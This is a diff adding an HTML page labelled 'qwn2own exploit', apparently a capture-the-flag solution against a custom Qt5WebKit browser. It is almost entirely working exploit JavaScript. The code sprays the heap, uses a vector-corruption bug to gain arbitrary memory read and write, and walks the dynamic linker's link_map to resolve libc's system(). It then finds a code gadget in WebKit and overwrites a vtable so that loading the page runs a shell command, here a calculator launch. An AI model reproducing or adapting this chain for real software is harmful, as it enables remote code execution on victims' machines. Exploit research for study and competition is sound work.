@@ -1,0 +1,343 @@
+<meta http-equiv="Cache-Control" content="no-cache"/>
+<head id="special">
+    qwn2own exploit
+</head>
+<script type="text/javascript">
+    db = BKPDataBase.create("mydb", "password");
+    gc = new Array();
+    target = {};
+    try{
+        var sentinel = 0x48484848
+        st = db.createStore("mystore", 1, [1,2,3,4,5,6,7,8,9,10], sentinel);
+        var spraysize = 0x800
+        var sprays = new Array(spraysize);
+
+        gc.push(sprays);
+
+        // let's spray
+        for(j = 0; j < spraysize; j++){
+            tst = db.createStore("mystore" + j, 1, [1,2,3,4,5,6,7,8,9,10], sentinel + j);
+            gc.push(tst);
+            sprays[j] = tst;
+        }
+
+        // we use the erase() bug to confuse it
+        // and increase the size of the vector 
+        // making it overlap with adjacent objects
+        // (this paritally corrupts the heap)
+        st.cut(1000, 0);
+
+        // let's get a leak
+        back = st.getall();
+        siz = st.size();
+
+
+        // let's overwrite the vtable pointers
+        // of the adjacent guys
+        text_base = 0x0;
+        heap_leak = 0x0;
+        off_to_base = 0x210400; // from binary we know this value
+        found_idx = 0xffffffff;
+        debug_str = "";
+        found_vtable_off = 0xffffffff;
+        found_vector_off = 0xffffffff;
+        for(i = 0; i < siz; i++){
+            curr = back[i] & 0xffffffff;
+            if((curr >= sentinel) && (curr <= sentinel + spraysize)){
+                if(text_base == 0x0){
+                    text_base = back[i - 6] - off_to_base;
+                    if((text_base & 0xfff) != 0x0){
+                        continue; 
+                    }
+                    found_idx = curr - sentinel;
+                    found_vtable_off = i - 6;
+                    found_vector_off = i - 2;
+                    break;
+                }
+            }
+        }
+
+        if(found_idx == 0xffffffff){
+            // keep trying
+            document.location.reload(true);
+        }
+
+
+        // the target object
+        target = sprays[found_idx];
+        if(typeof target == 'undefined'){
+            // keep trying
+            document.location.reload(true);
+        }
+
+        // overwrite vector pointer to use as arb reader
+        old_vector = st.get(found_vector_off);
+        fake_vector = old_vector + 0x18;
+
+        function arb_read(addr){
+            // we construct a fake QVector
+            // we use this for arbitrary read and write
+            target.insert(0, 0x00000000200000001);
+
+            // they matter for insertion
+            target.insert(1, -1);
+
+            // base address of vector
+            //got_addr = text_base + 0x0000000000210b68;
+            old_base = target.get(2);
+            target.insert(2, addr - fake_vector);
+
+            // overwrite the QVector
+            st.insert(found_vector_off, fake_vector);
+
+            ret_val = target.get(0); 
+
+            target.insert(2, old_base);
+            st.insert(found_vector_off, old_vector);
+
+            return ret_val;
+        };
+
+        function arr_to_str(arry){
+            ret_str = "";
+            for(var i = 0; i < arry.length; i++){
+                ret_str += String.fromCharCode(arry[i]);
+            }
+            return ret_str;
+        }
+
+        function read_str(addr){
+            curs = 0;
+            iter = addr - 3;
+            c_arr = [];
+
+            while(true){
+                curs = (arb_read(iter) >> 56) & 0xff;
+                if(curs == 0){
+                    break;
+                }
+                c_arr.push(curs);
+                iter = iter + 1;
+            }
+            return arr_to_str(c_arr); 
+        }
+
+        function arb_write(addr, wvalue){
+            // we construct a fake QVector
+            // we use this for arbitrary read and write
+            target.insert(0, 0x00000000200000001);
+
+            // they matter for insertion
+            target.insert(1, -1);
+
+            // base address of vector
+            //got_addr = text_base + 0x0000000000210b68;
+            old_base = target.get(2);
+            target.insert(2, addr - fake_vector);
+
+            // overwrite the QVector
+            st.insert(found_vector_off, fake_vector);
+
+            target.insert(0, wvalue); 
+
+            target.insert(2, old_base);
+            st.insert(found_vector_off, old_vector);
+        };
+
+        dynamic = text_base + 0x210910;     // from binary we know this offset
+
+        // let's find dt_debug
+        cursor = dynamic;
+        dt_debug_ptr = 0;
+        while(true){
+            tag = arb_read(cursor);
+            if(tag == 0x15){
+                dt_debug_ptr = cursor + 0x8;
+                break;
+            }
+            cursor = cursor + 0x8;
+        }
+
+        if(dt_debug_ptr == 0x0){
+            // try again
+            // but this should never fail
+            document.location.reload(true); 
+        }
+
+        dt_debug = arb_read(dt_debug_ptr);
+        r_map = arb_read(dt_debug + 0x8);
+
+        // we get a list of the mmapings and their base addresses
+        // by scaning the link_map
+        mappings_list = [];
+
+        // we use l_name to get base addresses
+        ld_so_base = 0;
+        ld_so_dynamic = 0;
+
+        libc_base = 0;
+        libc_dynamic = 0;
+
+        lqwk_base = 0;
+        lqwk_dynamic = 0;
+
+        while(true){
+            if(r_map == 0x0){
+                // we have reached the end
+                break; 
+            }
+            map_base = arb_read(r_map);
+            l_name = arb_read(r_map + 0x8);
+            obj_name = read_str(l_name);
+            dt_dynamic = arb_read(r_map + 0x10);
+            if(obj_name.indexOf("ld-linux") > -1){
+                ld_so_base = map_base;
+                ld_so_dynamic = dt_dynamic;
+            }else if(obj_name.indexOf("libc.so") > -1){
+                libc_base = map_base;
+                libc_dynamic = dt_dynamic;
+            }else if(obj_name.indexOf("Qt5WebKit.so") > -1){
+                lqwk_base = map_base;
+                lqwk_dynamic = dt_dynamic;
+            }
+            r_map = arb_read(r_map + 0x18);
+            mappings_list.push(map_base);
+        }
+
+        if(ld_so_base == 0 || libc_base == 0){
+            // try it again
+            document.location.reload(true); 
+        }
+
+
+
+        // let's get the STRTAB and SYMTAB of
+        // binary
+        function get_dyn_entries(dyn_addr){
+            cursor = dyn_addr;
+            strtab = 0;
+            symtab = 0;
+            while(true){
+                tag = arb_read(cursor);
+                if(tag == 0){
+                    break; 
+                }
+                if(tag == 0x5){
+                    strtab = arb_read(cursor + 0x8);
+                }else if(tag == 0x6){
+                    symtab = arb_read(cursor + 0x8);
+                }
+                cursor = cursor + 0x8;
+            }
+            return [strtab, symtab];
+        };
+
+        // let's get the dynamic entries
+        // of libc that we need
+        dyn_entries = get_dyn_entries(libc_dynamic);
+        libc_strtab = dyn_entries[0];
+        libc_symtab = dyn_entries[1];
+
+        // using strtab and symtab we can resolve
+        // function addresses
+        function resolve_func(obj_base, strtab, symtab, func_name){
+            idx = 0;
+
+            // scan symtab and strtab
+            // ELF64 sym = 192
+            // 32bit st_name - idx in str table
+            // 8bit st_info - what kind of symbol is this
+            // 8bit st_other - idgaf
+            // 16bit st_shndx - idgaf
+            // 64bit st_value - address of the guy
+            // 64bit st_size - size of symbol or zero
+            while(true){
+                cursym = symtab + idx * 24;
+                st_name = arb_read(cursym) & 0xffffffff;
+                sym_str = read_str(strtab + st_name);
+                if(sym_str.indexOf(func_name) > -1){
+                    return obj_base + arb_read(cursym + 4 + 1 + 1 + 2);
+                }
+                idx += 1;
+            }
+        };
+
+        // let's resolve the address of system
+        system_addr = resolve_func(libc_base, libc_strtab, libc_symtab, "libc_system");
+
+        // let's look for the following gadget
+        // inside the Webkit
+
+        // mov    rbx,rdi
+		// mov    rsi,QWORD PTR [rdi+0x28]
+		// mov    QWORD PTR [rdi],rax
+		// mov    rdi,QWORD PTR [rdi+0x10]
+		// call   QWORD PTR [rbx+0x20]
+
+        // let's compare as strings
+        // javascript can't deal with 64
+        sig0 = "4828778b48fb";
+        sig1 = "53ff107f8b48";
+        mask = 0xffffffffffff0000;
+
+        sidx = 0;
+        gadget_addr = 0;
+
+        while(true){
+            if((sidx % 0x20000) == 0){
+                document.write("Looking for ggt at: " + sidx.toString(16)); 
+            }
+
+            val0 = arb_read(lqwk_base + sidx * 8);
+            val0s = val0.toString(16).substring(0, 12);
+            sidx += 1;
+            if(val0s != sig0){
+                continue; 
+            }
+
+            val1 = arb_read(lqwk_base + sidx * 8);
+            val1s = val1.toString(16).substring(0, 12);
+            if(val1s == sig1){
+		        gadget_addr = lqwk_base + (sidx - 1) * 8;
+                break;
+            }
+            sidx += 1;
+        }
+
+        if(gadget_addr == 0){
+            // didn't find gadget :(
+            document.location.reload(true); 
+        }
+
+		//gadget_addr = lqwk_base + 0x4c04b8;
+
+        // overwrite vtable
+        // let's put our fake_vtable somewhere in the 
+        // heap after fake_vector :|
+        fake_vtable = fake_vector + 400;
+        // let's fix things up
+
+        cmd = "/usr/bin/gnome-calculator -e 0xb00b";
+        cmd_addr = fake_vtable + 0x80; // somewhere in heap
+
+        // write string to execute
+        for(j = 0; j < cmd.length; j++){
+            arb_write(cmd_addr + j, cmd[j].charCodeAt(0));
+        }
+        arb_write(cmd_addr + cmd.length, 0);
+
+        // write the things
+        arb_write(fake_vtable, gadget_addr);            // put the gadget in vtable
+        st.insert(found_vtable_off + 4, system_addr);   // rip
+        st.insert(found_vtable_off + 2, cmd_addr);      // rdi
+        st.insert(found_vtable_off, fake_vtable);       // vtable
+
+
+        // trigger grill
+        target.insert(0, 1);
+        alert("Shouldn't reach");
+    }catch(e){
+        document.location.reload(true);
+        alert(e);
+    };
+</script>
